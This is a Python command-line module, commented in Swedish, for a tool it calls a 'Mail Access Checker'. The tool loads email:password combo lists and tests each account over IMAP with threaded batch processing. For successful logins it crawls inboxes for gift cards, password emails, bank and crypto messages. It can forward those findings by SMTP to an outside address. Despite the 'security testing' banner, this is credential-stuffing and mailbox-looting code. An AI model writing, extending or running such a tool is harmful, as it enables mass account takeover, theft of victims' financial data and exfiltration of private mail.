"""
Command Line Interface för Mail Access Checker
"""

import time
from typing import List, Dict, Any
from pathlib import Path

from core.config import Config
from core.logger import MailAccessLogger
from core.exceptions import MailAccessException
from protocols.imap_client import IMAPClient
from protocols.smtp_client import EmailForwarder
from processing.batch_processor import BatchProcessor

class CLI:
    """Command Line Interface för Mail Access Checker"""
    
    def __init__(self, config: Config, logger: MailAccessLogger):
        self.config = config
        self.logger = logger
        self.results = {
            'valid': 0,
            'invalid': 0,
            'timeout': 0,
            'error': 0,
            'rate_limited': 0,
            'unknown': 0
        }
        self.start_time = None
        self.processed_accounts = 0
        self.total_accounts = 0
        
        # Skapa IMAP-klient
        self.imap_client = IMAPClient(config, logger)
        
        # Skapa email forwarder
        self.email_forwarder = EmailForwarder(config, logger)
        if config.enable_forwarding:
            self.email_forwarder.setup_forwarding(
                config.forward_to_email,
                config.forward_from_email,
                config.forward_password,
                config.forward_smtp_server
            )
        
        # Lagra detaljerade resultat för rapportering
        self.detailed_results = []
        
        # Batch processor för stora listor
        self.batch_processor = BatchProcessor(config, logger)
    
    def run(self):
        """Huvudfunktion för CLI"""
        try:
            self._show_banner()
            self._validate_config()
            
            # Ladda konton att testa
            accounts = self._load_accounts()
            self.total_accounts = len(accounts)
            
            if not accounts:
                self.logger.error("Inga konton att testa")
                return
            
            self.logger.info(f"Laddat {len(accounts)} konton för testning")
            self.logger.info(f"Protokoll: {self.config.protocol.upper()}")
            self.logger.info(f"Trådar: {self.config.max_threads}")
            self.logger.info(f"Timeout: {self.config.timeout}s")
            
            # Välj testningsmetod baserat på antal konton
            if len(accounts) >= 10:
                # Använd batch processor för större listor
                self._start_batch_testing(accounts)
            else:
                # Använd enkel testning för små listor
                self._start_testing(accounts)
            
            # Visa resultat
            self._show_results()
            
        except KeyboardInterrupt:
            self.logger.warning("\nTestning avbruten av användare")
        except Exception as e:
            self.logger.error(f"Oväntat fel: {e}")
    
    def _show_banner(self):
        """Visar applikationsbanner"""
        banner_text = """Mail Access Checker
Utvecklat för säkerhetstestning
Version 1.0"""
        self.logger.banner(banner_text)
    
    def _validate_config(self):
        """Validerar konfiguration"""
        try:
            self.config.validate()
            if self.config.verbose:
                self.logger.info("Konfiguration validerad")
                self.logger.debug(str(self.config))
        except Exception as e:
            raise MailAccessException(f"Konfigurationsfel: {e}")
    
    def _load_accounts(self) -> List[Dict[str, str]]:
        """Laddar konton från fil eller CLI-argument"""
        accounts = []
        
        if self.config.target_email and self.config.target_password:
            # Enskilt konto från CLI
            accounts.append({
                'email': self.config.target_email,
                'password': self.config.target_password
            })
            self.logger.debug(f"Laddat enskilt konto: {self.config.target_email}")
            
        elif self.config.input_file:
            # Konton från fil
            accounts = self._load_accounts_from_file(self.config.input_file)
        
        return accounts
    
    def _load_accounts_from_file(self, file_path: str) -> List[Dict[str, str]]:
        """Laddar konton från fil"""
        accounts = []
        file_path = Path(file_path)
        
        if not file_path.exists():
            raise FileNotFoundError(f"Filen hittades inte: {file_path}")
        
        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                for line_num, line in enumerate(f, 1):
                    line = line.strip()
                    if not line or line.startswith('#'):
                        continue
                    
                    # Förväntar format: email:password
                    if ':' in line:
                        email, password = line.split(':', 1)
                        accounts.append({
                            'email': email.strip(),
                            'password': password.strip()
                        })
                    else:
                        self.logger.warning(f"Ogiltig rad {line_num}: {line}")
            
            self.logger.debug(f"Laddat {len(accounts)} konton från {file_path}")
            
        except Exception as e:
            raise MailAccessException(f"Fel vid läsning av fil {file_path}: {e}")
        
        return accounts
    
    def _start_testing(self, accounts: List[Dict[str, str]]):
        """Startar testning av konton"""
        self.start_time = time.time()
        self.logger.info("\nStartar testning...")
        
        # För nu: simulera testning (vi implementerar riktiga protokoll senare)
        for i, account in enumerate(accounts, 1):
            self._test_account(account)
            self.processed_accounts = i
            
            # Visa progress
            self.logger.progress(i, len(accounts), f"Testar {account['email']}")
            
            # Delay mellan test
            if self.config.delay_between_attempts > 0:
                time.sleep(self.config.delay_between_attempts)
        
        print()  # Ny rad efter progress bar
    
    def _start_batch_testing(self, accounts: List[Dict[str, str]]):
        """Startar batch-testning för stora combo-listor"""
        self.start_time = time.time()
        self.logger.info(f"\nStartar batch-testning med {self.config.max_threads} trådar...")
        
        # Progress callback
        def progress_callback(current: int, total: int):
            self.logger.progress(current, total, f"Batch progress")
        
        try:
            # Använd batch processor
            batch_results = self.batch_processor.process_accounts(accounts, progress_callback)
            
            # Sammanställ resultat
            self.detailed_results = batch_results
            self._consolidate_batch_results(batch_results)
            
            print()  # Ny rad efter progress
            
        except KeyboardInterrupt:
            self.logger.warning("\nBatch-testning avbruten av användare")
            self.batch_processor.stop_processing()
            # Sammanställ partiella resultat
            self._consolidate_batch_results(self.batch_processor.detailed_results)
    
    def _consolidate_batch_results(self, batch_results: List[Dict[str, Any]]):
        """Sammanställer resultat från batch processor"""
        # Nollställ räknare
        for key in self.results:
            self.results[key] = 0
        
        # Räkna resultat från batch
        for result in batch_results:
            status = result.get('status', 'unknown')
            
            if status == 'valid':
                self.results['valid'] += 1
            elif status == 'invalid':
                self.results['invalid'] += 1
            elif status in ['connection_error', 'timeout']:
                self.results['timeout'] += 1
            elif status == 'requires_2fa':
                self.results['unknown'] += 1
            else:
                self.results['error'] += 1
        
        self.processed_accounts = len(batch_results)
    
    def _test_account(self, account: Dict[str, str]):
        """Testar ett enskilt konto med riktig IMAP-anslutning"""
        email = account['email']
        password = account['password']
        
        try:
            self.logger.debug(f"Testar {email}")
            
            # Använd IMAP-klient för riktig testning
            test_result = self.imap_client.test_account(email, password)
            
            # Uppdatera resultaträknare
            status = test_result['status']
            
            if status == 'valid':
                self.logger.success(f"VALID: {email} - {test_result.get('message_count', 0)} meddelanden")
                self.results['valid'] += 1
                
                # Rapportera crawling-resultat om funna
                crawl_results = test_result.get('crawl_results', {})
                if crawl_results:
                    self._report_crawl_findings(email, crawl_results)
                    
                    # Skicka findings via email om konfigurerat
                    if self.config.enable_forwarding:
                        self.email_forwarder.forward_findings(email, crawl_results)
                    
            elif status == 'invalid':
                self.logger.error(f"INVALID: {email}")
                self.results['invalid'] += 1
                
            elif status == 'requires_2fa':
                self.logger.warning(f"2FA REQUIRED: {email}")
                self.results['unknown'] += 1
                
            elif status == 'connection_error':
                self.logger.warning(f"CONNECTION ERROR: {email}")
                self.results['timeout'] += 1
                
            else:
                self.logger.warning(f"UNKNOWN: {email}")
                self.results['unknown'] += 1
            
            # Spara detaljerat resultat
            self.detailed_results.append(test_result)
            
            # Spara grundläggande resultat om konfigurerat
            if self.config.output_file:
                self._save_result(email, status, test_result)
                
        except Exception as e:
            self.logger.error(f"Fel vid testning av {email}: {e}")
            self.results['error'] += 1
    
    def _report_crawl_findings(self, email: str, crawl_results: Dict[str, Any]):
        """Rapporterar funna intressanta meddelanden"""
        findings = []
        
        # Presentkort
        if crawl_results.get('gift_cards'):
            count = len(crawl_results['gift_cards'])
            findings.append(f"🎁 {count} presentkort")
            
        # Lösenord
        if crawl_results.get('passwords'):
            count = len(crawl_results['passwords'])
            findings.append(f"🔐 {count} lösenordsmail")
            
        # Bank/finansiellt
        if crawl_results.get('bank_info'):
            count = len(crawl_results['bank_info'])
            findings.append(f"💳 {count} bankmail")
            
        # Krypto
        if crawl_results.get('crypto_info'):
            count = len(crawl_results['crypto_info'])
            findings.append(f"₿ {count} kryptomail")
        
        if findings:
            findings_str = ", ".join(findings)
            self.logger.info(f"   └─ Funnet: {findings_str}")
    
    def _save_result(self, email: str, status: str, test_result: Dict[str, Any]):
        """Sparar testresultat till fil"""
        try:
            output_path = Path(self.config.output_file)
            output_path.parent.mkdir(parents=True, exist_ok=True)
            
            # Grundläggande resultatrad
            result_line = f"{email}:{status}"
            
            # Lägg till extra information för lyckade anslutningar
            if status == 'valid' and test_result.get('accessible'):
                message_count = test_result.get('message_count', 0)
                result_line += f":{message_count}_messages"
                
                # Lägg till crawling-sammanfattning
                crawl_results = test_result.get('crawl_results', {})
                if crawl_results:
                    summary_parts = []
                    if crawl_results.get('gift_cards'):
                        summary_parts.append(f"gifts:{len(crawl_results['gift_cards'])}")
                    if crawl_results.get('passwords'):
                        summary_parts.append(f"passwords:{len(crawl_results['passwords'])}")
                    if crawl_results.get('bank_info'):
                        summary_parts.append(f"bank:{len(crawl_results['bank_info'])}")
                    if crawl_results.get('crypto_info'):
                        summary_parts.append(f"crypto:{len(crawl_results['crypto_info'])}")
                    
                    if summary_parts:
                        result_line += f":findings:{','.join(summary_parts)}"
            
            result_line += "\n"
            
            # Skriv till fil (append mode)
            with open(output_path, 'a', encoding='utf-8') as f:
                f.write(result_line)
                
        except Exception as e:
            self.logger.error(f"Fel vid sparande av resultat: {e}")
    
    def _save_detailed_results(self):
        """Sparar detaljerade resultat till separat fil"""
        if not self.detailed_results:
            return
            
        try:
            # Skapa detaljerad resultatfil
            if self.config.output_file:
                base_path = Path(self.config.output_file)
                detailed_path = base_path.parent / f"{base_path.stem}_detailed.json"
            else:
                detailed_path = Path("detailed_results.json")
            
            import json
            
            # Filtrera bort känslig information från lösenord
            sanitized_results = []
            for result in self.detailed_results:
                sanitized = result.copy()
                if 'password' in sanitized:
                    del sanitized['password']
                sanitized_results.append(sanitized)
            
            with open(detailed_path, 'w', encoding='utf-8') as f:
                json.dump(sanitized_results, f, indent=2, ensure_ascii=False, default=str)
                
            self.logger.info(f"Detaljerade resultat sparade i: {detailed_path}")
            
        except Exception as e:
            self.logger.error(f"Fel vid sparande av detaljerade resultat: {e}")
    
    def _show_results(self):
        """Visar testresultat"""
        end_time = time.time()
        duration = end_time - self.start_time if self.start_time else 0
        
        self.logger.info(f"\nTestning slutförd på {duration:.2f} sekunder")
        
        # Visa detaljerad sammanfattning
        self.logger.result_summary(self.results)
        
        # Beräkna statistik
        total_tested = sum(self.results.values())
        if total_tested > 0:
            success_rate = (self.results['valid'] / total_tested) * 100
            self.logger.info(f"\nFramgångsgrad: {success_rate:.1f}%")
            
            if duration > 0:
                rate = total_tested / duration
                self.logger.info(f"Testningshastighet: {rate:.1f} konton/sekund")
        
        # Visa var resultat sparades
        if self.config.output_file:
            self.logger.info(f"Resultat sparade i: {self.config.output_file}")
            
        # Spara detaljerade resultat
        self._save_detailed_results()
        
        # Skicka sammanfattningsrapport om forwarding är aktiverat
        if self.config.enable_forwarding and self.detailed_results:
            self.email_forwarder.send_summary_report(self.detailed_results)
    
    def _format_duration(self, seconds: float) -> str:
        """Formaterar duration till läsbar text"""
        if seconds < 60:
            return f"{seconds:.1f} sekunder"
        elif seconds < 3600:
            minutes = seconds / 60
            return f"{minutes:.1f} minuter"
        else:
            hours = seconds / 3600
            return f"{hours:.1f} timmar"